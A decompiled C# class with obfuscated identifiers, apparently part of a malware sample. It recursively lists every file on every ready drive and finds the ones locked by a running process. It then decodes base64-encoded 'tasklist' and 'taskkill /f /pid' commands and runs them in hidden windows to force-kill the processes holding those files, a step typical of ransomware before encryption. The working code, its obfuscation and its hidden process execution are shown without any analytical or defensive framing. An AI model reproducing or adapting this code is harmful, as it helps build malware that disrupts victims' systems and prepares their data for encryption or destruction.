using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace YXHSMjloYIX;

internal class vIiOdwpLyxjpGf
{
	[CompilerGenerated]
	private sealed class jlvAvDwkJQpmCYOP
	{
		public string RvZVtvRTlFUMqJJ;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(RvZVtvRTlFUMqJJ);
		}
	}

	public static readonly List<string> FZOJTKhhVdzr = new List<string>();

	public static readonly List<string> OmziJPTdCoFO = new List<string>();

	public static void vwfhaxPtBngL()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					gLsfQNxYRHXZ(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void gLsfQNxYRHXZ(string KHeeFdnUJiBqIT)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(KHeeFdnUJiBqIT);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					FZOJTKhhVdzr.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					gLsfQNxYRHXZ(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (FZOJTKhhVdzr.Count <= 0)
		{
			return;
		}
		foreach (string item in FZOJTKhhVdzr.Where((string NFqMeMVQMRhX) => iDVHILqBuXK(NFqMeMVQMRhX)))
		{
			OmziJPTdCoFO.Add(item);
		}
		FZOJTKhhVdzr.Clear();
		if (OmziJPTdCoFO.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in OmziJPTdCoFO.Select((string cOfovDaRacWBAHFS) => new FileInfo(cOfovDaRacWBAHFS)))
		{
			QPpsHyEiCqZW(item2.Name);
		}
	}

	public static bool iDVHILqBuXK(string SvPfzNjOUPSsV)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(SvPfzNjOUPSsV, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(SvPfzNjOUPSsV, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void QPpsHyEiCqZW(string iSFlcPtRnrS)
	{
		try
		{
			string text = RhVItRoTqmUGdE(zkwozuPRYYOVZ.bxMeQFfPcma("dGFza2xpc3Q="), zkwozuPRYYOVZ.bxMeQFfPcma("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(iSFlcPtRnrS)
				select t into HbUMAvQtOVI
				select HbUMAvQtOVI.Split(new char[1] { ',' }) into NRGvppqSWFCr
				select NRGvppqSWFCr[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				RhVItRoTqmUGdE(zkwozuPRYYOVZ.bxMeQFfPcma("dGFza2tpbGw="), zkwozuPRYYOVZ.bxMeQFfPcma("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string RhVItRoTqmUGdE(string nUtYRaAhFTJ, string spePZnUwkTklLj)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(nUtYRaAhFTJ, spePZnUwkTklLj);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
